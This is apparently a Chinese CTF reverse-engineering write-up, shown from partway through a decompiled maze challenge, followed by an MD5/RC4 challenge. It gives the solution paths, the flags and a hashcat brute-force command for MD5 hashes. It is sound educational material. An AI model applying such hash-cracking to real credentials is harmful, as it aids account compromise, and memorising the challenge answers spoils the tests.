  char v46; // [sp+50h] [bp-13Ch]@1
  char v47; // [sp+51h] [bp-13Bh]@1
  char v48; // [sp+52h] [bp-13Ah]@1
  char v49; // [sp+53h] [bp-139h]@1
  char v50; // [sp+54h] [bp-138h]@1
  char v51; // [sp+55h] [bp-137h]@1
  char v52; // [sp+56h] [bp-136h]@1
  char v53; // [sp+57h] [bp-135h]@1
  char v54; // [sp+58h] [bp-134h]@1
  char v55; // [sp+59h] [bp-133h]@1
  char v56; // [sp+5Ah] [bp-132h]@1
  char v57; // [sp+5Bh] [bp-131h]@1
  char v58; // [sp+5Ch] [bp-130h]@1
  char v59; // [sp+5Dh] [bp-12Fh]@1
  char v60; // [sp+5Eh] [bp-12Eh]@1
  char v61; // [sp+5Fh] [bp-12Dh]@1
  char v62; // [sp+60h] [bp-12Ch]@1
  char v63; // [sp+61h] [bp-12Bh]@1
  char v64; // [sp+62h] [bp-12Ah]@1
  char v65; // [sp+63h] [bp-129h]@1
  char v66; // [sp+64h] [bp-128h]@1
  char v67; // [sp+65h] [bp-127h]@1
  char v68; // [sp+66h] [bp-126h]@1
  char v69; // [sp+67h] [bp-125h]@1
  char v70; // [sp+68h] [bp-124h]@1
  char v71; // [sp+69h] [bp-123h]@1
  char v72; // [sp+6Ah] [bp-122h]@1
  char v73; // [sp+6Bh] [bp-121h]@1
  char v74; // [sp+6Ch] [bp-120h]@1
  char v75; // [sp+6Dh] [bp-11Fh]@1
  char v76; // [sp+6Eh] [bp-11Eh]@1
  char v77; // [sp+6Fh] [bp-11Dh]@1
  char v78; // [sp+70h] [bp-11Ch]@1
  char v79; // [sp+71h] [bp-11Bh]@1
  char v80; // [sp+72h] [bp-11Ah]@1
  char v81; // [sp+73h] [bp-119h]@1
  char v82; // [sp+74h] [bp-118h]@1
  char v83; // [sp+75h] [bp-117h]@1
  char v84; // [sp+76h] [bp-116h]@1
  char v85; // [sp+77h] [bp-115h]@1
  char v86; // [sp+78h] [bp-114h]@1
  char v87; // [sp+79h] [bp-113h]@1
  char v88; // [sp+7Ah] [bp-112h]@1
  char v89; // [sp+7Bh] [bp-111h]@1
  char v90; // [sp+7Ch] [bp-110h]@1
  char v91; // [sp+7Dh] [bp-10Fh]@1
  char v92; // [sp+7Eh] [bp-10Eh]@1
  char v93; // [sp+7Fh] [bp-10Dh]@1
  char v94; // [sp+80h] [bp-10Ch]@21

  sub_4024C0();
  v23 = -53;
  v24 = -2;
  v25 = 28;
  v26 = 114;
  v27 = 14;
  v28 = 99;
  v29 = -31;
  v30 = 63;
  v31 = -29;
  v32 = 51;
  v33 = 38;
  v34 = -41;
  v35 = 47;
  v36 = 76;
  v37 = 119;
  v38 = -70;
  v39 = -118;
  v40 = 0;
  v9 = -53;
  v10 = -14;
  v11 = 28;
  v12 = 108;
  v13 = 26;
  v14 = 61;
  v15 = -96;
  v16 = 60;
  v17 = -28;
  v18 = 48;
  v19 = 41;
  v20 = -60;
  v21 = 103;
  v22 = 0;
  v41 = -126;
  v42 = -36;
  v43 = 29;
  v44 = 60;
  v45 = 16;
  v46 = 126;
  v47 = -11;
  v48 = 107;
  v49 = -15;
  v50 = 58;
  v51 = 51;
  v52 = -125;
  v53 = 41;
  v54 = 86;
  v55 = 109;
  v56 = -23;
  v57 = -60;
  v58 = 61;
  v59 = -31;
  v60 = 82;
  v61 = -116;
  v62 = -25;
  v63 = 111;
  v64 = 58;
  v65 = 21;
  v66 = 88;
  v67 = -35;
  v68 = -72;
  v69 = -120;
  v70 = -85;
  v71 = -71;
  v72 = 67;
  v73 = -104;
  v74 = -97;
  v75 = 116;
  v76 = 7;
  v77 = -82;
  v78 = -112;
  v79 = 32;
  v80 = 61;
  v81 = 79;
  v82 = 99;
  v83 = 116;
  v84 = 118;
  v85 = 127;
  v86 = 35;
  v87 = 72;
  v88 = 125;
  v89 = 32;
  v90 = 111;
  v91 = 90;
  v92 = -11;
  v93 = 0;
  v0 = malloc(0x12Cu);
  v1 = malloc(0x1000u);
  v7 = (int)v1;
  memset(v1, 0, 0x1000u);
  v2 = 1;
  sub_4017D0((int)v0, "#-############################");
  sub_4017D0((int)(v0 + 30), "#-###########----------------#");
  sub_4017D0((int)(v0 + 60), "#-###########-#########-######");
  sub_4017D0((int)(v0 + 90), "#-------------#########-######");
  sub_4017D0((int)(v0 + 120), "####-####-#############-######");
  sub_4017D0((int)(v0 + 150), "####-####-#############-######");
  sub_4017D0((int)(v0 + 180), "#####-------###########-######");
  sub_4017D0((int)(v0 + 210), "#####-###############---######");
  sub_4017D0((int)(v0 + 240), "#-----############----########");
  sub_4017D0((int)(v0 + 270), "##################-###########");
  sub_401620(&v41);
  v8 = v0;
  v3 = 0;
  while ( 1 )
  {
    if ( v8[v2] == 35 )
    {
LABEL_12:
      sub_401620(&v9);
      exit(1);
    }
    if ( v2 == 288 )
      break;
    v4 = getch();
    if ( (v4 & 0xFB) != 115 && v4 != 97 && v4 != 100 )
      goto LABEL_12;
    *(_BYTE *)(v7 + ++v3 - 1) = v4;
    putchar(v4);
    if ( v4 == 100 )
    {
      if ( v2 == 29 * (v2 / 29) )
        goto LABEL_12;
      ++v2;
    }
    else if ( v4 <= 100 )
    {
      if ( v4 == 97 )
      {
        if ( v2 == 30 * (v2 / 30) )
          goto LABEL_12;
        --v2;
      }
    }
    else if ( v4 == 115 )
    {
      v2 += 30;
      if ( v2 > 299 )
        goto LABEL_12;
    }
    else if ( v4 == 119 )
    {
      v2 -= 30;
      if ( v2 < 0 )
        goto LABEL_12;
    }
  }
  sub_401620(&v23);
  memset(&v94, 0, 0x100u);
  sub_401500((int)&v94, v7, v3);
  v5 = strlen(asc_40400F);
  sub_4015A0((int)&v94, asc_40400F, v5);
  printf("\n%s", asc_40400F);
  getch();
  return 0;
}
```

读代码，几个十进制ASCII码反复出现：119，115，97，100。查阅ASCII表，分别对应w,s,a,d四个字母。结合它们在键盘的相对位置和这题迷宫的背景，得出这四个字母用来控制坐标上下左右移动。

分析迷宫，'#'代表路障，'-'代表通路。完整走一遍路径，转换为wsad四个字母的表示，将其作为输入的字符串提交，得到flag：**flag{HUST_CyberSecurity}**

![Screen Shot 2019-02-03 at 8.31.25 AM](https://ws3.sinaimg.cn/large/006tNc79ly1fzsxn1s5b8j30fe04ot9x.jpg)

---

### 人生有时候就是要莽一点

PEID查壳->无壳。

IDA载入，对main函数反编译，代码如下：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char *v3; // eax@1
  char *v4; // ebx@1
  void *v5; // esi@1
  int v6; // edx@4
  void *v8; // [sp+1Ch] [bp-180h]@1
  int v9; // [sp+28h] [bp-174h]@2
  int v10; // [sp+38h] [bp-164h]@2
  int v11; // [sp+3Ch] [bp-160h]@2
  signed int v12; // [sp+40h] [bp-15Ch]@2
  signed int v13; // [sp+44h] [bp-158h]@2
  signed int v14; // [sp+48h] [bp-154h]@2
  signed int v15; // [sp+4Ch] [bp-150h]@2
  int v16; // [sp+90h] [bp-10Ch]@9

  __main();
  v3 = (char *)malloc(0xFu); // 注意长度
  *(_DWORD *)v3 = 0;
  *((_DWORD *)v3 + 1) = 0;
  v4 = v3;
  *((_DWORD *)v3 + 2) = 0;
  *((_WORD *)v3 + 6) = 0;
  v3[14] = 0;
  v5 = malloc(0x1000u);
  memset(v5, 0, 0x1000u);
  v8 = malloc(0x100u);
  memset(v8, 0, 0x100u);
  puts("Please input something...");
  if ( scanf("%s", v5) <= 50//v5:lyjjj_
    && (strncpy((char *)v8, (const char *)v5, 5u),//v8:lyjjj
        v10 = 0,
        v11 = 0,
        v12 = 1732584193,
        v13 = -271733879,
        v14 = -1732584194,
        v15 = 271733878,
        MD5Update(&v10, v8, strlen((const char *)v8)),
        MD5Final(&v10, &v9),
        !memcmp(&v9, firstMd5, 0x10u))//两个md5（十六位十六进制数）compare
    && *((_BYTE *)v5 + 5) == 95//由此处逆推得到v5的第6位为_
    && (strcat(v4, (const char *)v5),//v4:lyjjj_
        memset(v8, 0, 0x100u),
        puts("Please input something..."),
        getchar(),
        gets((char *)v5),//v5:tql_
        strncpy((char *)v8, (const char *)v5, 3u),//v8:tql
        v10 = 0,
        v11 = 0,
        v12 = 1732584193,
        v13 = -271733879,
        v14 = -1732584194,
        v15 = 271733878,
        MD5Update(&v10, v8, strlen((const char *)v8)),
        MD5Final(&v10, &v9),
        !memcmp(&v9, &secondMd5, 0x10u))
    && *((_BYTE *)v5 + 3) == 95//由此处逆推得到v5的第4位为_
    && (strcat(v4, (const char *)v5),//v4:lyjjj_tql_
        fwrite("Please input something...\n", 1u, 0x1Au, &__iob[1]),
        fgets((char *)v5, 4096, (FILE *)__iob[0]._ptr),
        v10 = 0,
        v11 = 0,
        v12 = 1732584193,
        v13 = -271733879,
        v14 = -1732584194,
        v15 = 271733878,
        MD5Update(&v10, v5, strlen((const char *)v5)),
        MD5Final(&v10, &v9),
        !memcmp(&v9, &thirdMd5, 0x10u)) )
  {
    strcat(v4, (const char *)v5);
    memset(&v16, 0, 0x100u);
    rc4_init((int)&v16, (int)v4, strlen(v4));//v4是密钥
    rc4_crypto((int)&v16, flag, strlen(flag));//形参flag已被加密，这是解密的函数
    fputs(flag, &__iob[1]);//将flag输出
    getchar();
    free(v4);
    free(v8);
    free(v5);
    v6 = 0;
  }
  else
  {
    fwrite("Oops!...\n", 1u, 9u, &__iob[1]);
    v6 = 1;
  }
  return v6;
}
```

大致梳理一下程序的逻辑（正向）：

输入三个字符串，一个取前5位，一个取前3位，一个取全部位，分别作MD5加密。MD5加密结果已知，三个字符串长度又都不长，可直接hashcat爆破（Brute-Force），反推明文。前两个字符串MD5加密所取位数的后一位（一个第6位，一个第4位，也是这两个字符串的最后一位）都为‘_’。将三个字符串拼接到一起，合成一个长串。（长串长度不超15位，前两个字符串共占5+1+3+1=10位，故第三个字符串最长5位，反推出前面可直接爆破MD5的结论）将该长串作为密钥，将已用RC4算法加密过的flag解密。

|    MD5    |      Hex Value (ciphertext)      | String (plaintext) |
| :-------: | :------------------------------: | :----------------: |
| firstMd5  | 92F996F7B9971CBEDADAEBD27F253DB6 |       lyjjj        |
| secondMd5 | 5FD277BE39046905EF6348BA89131922 |        tql         |
| thirdMd5  | 7BC2F9AE72073B9654A653C18BFBA313 |        ???         |

第三个MD5的原字符串（明文）之所以打问号，是因为一开始用hashcat竟然没跑出来。按照前面的论证，字符串长度不会超5位，理应1分钟内爆破出结果。仔细分析，发现hashcat默认明文由可见字符（下图的ASCII打印字符）组成，而不考虑不可见字符（ASCII控制字符以及未定义的字符）。

![img](https://ws1.sinaimg.cn/large/006tNc79ly1fzscpkydkqj30w30mngvj.jpg)

故hashcat加参数重新爆破（“?b”代表0x00-0xff的Hex Value）

`hashcat -a 3 -m 0 7BC2F9AE72073B9654A653C18BFBA313 -O --increment --increment-min 1 --increment-max 5 ?b?b?b?b?b`

![Screen Shot 2019-02-02 at 8.11.54 PM](https://ws3.sinaimg.cn/large/006tNc79ly1fzscprivlej31300kun2h.jpg)

得thirdMd5的明文：十六进制下的`77736c0a`，对应ASCII码`wsl\n`。

这题出得妙，妙在何处？

1. 不可见字符也可进行MD5加密是我们思维中的盲点，也是众多在线MD5加解密平台的盲点。
2. 既然选用键盘作为输入源，那么键盘所能输入的不可显示的字符极其有限，而换行符\n恰恰就是其一。
3. 回看输入三个字符串时所用函数，一个scanf，一个gets，最后一个fgets。fgets不过滤换行符\n，使其成为字符串的一部分。

以上三点，逻辑自洽。

最后，运行程序，将三个字符串输入，拿到flag：**flag{l3h_Plastic_Memory}**

![Screen Shot 2019-02-02 at 6.22.39 PM](https://ws3.sinaimg.cn/large/006tNc79ly1fzs93zpbwjj307q05idgf.jpg)